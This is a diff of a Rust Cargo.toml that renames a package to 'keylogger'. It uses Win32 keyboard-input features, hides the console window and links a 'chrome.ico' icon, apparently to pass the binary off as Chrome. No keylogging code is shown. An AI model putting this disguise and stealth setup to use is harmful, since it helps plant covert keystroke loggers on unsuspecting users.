@@ -1,5 +1,5 @@
 [package]
-name = "_intel"
+name = "keylogger"
 version = "0.1.0"
 edition = "2021"
 
@@ -22,6 +22,7 @@ features = [
     "Win32_UI_WindowsAndMessaging",
     "Win32_UI_Input_KeyboardAndMouse",
     "Win32_UI_TextServices",
+    "Win32_System_Console",
 ]
 
 # https://github.com/johnthagen/min-sized-rust
@@ -31,3 +32,14 @@ opt-level = "z"  # Optimize for size.
 lto = true
 codegen-units = 1
 panic = "abort"
+incremental = false
+debug = false
+rpath = false
+overflow-checks = true
+
+[package.metadata.windows]
+subsystem = "windows"
+
+[build]
+# the path to your .res file
+rustflags = ["-C", "link-arg=chrome.ico"]
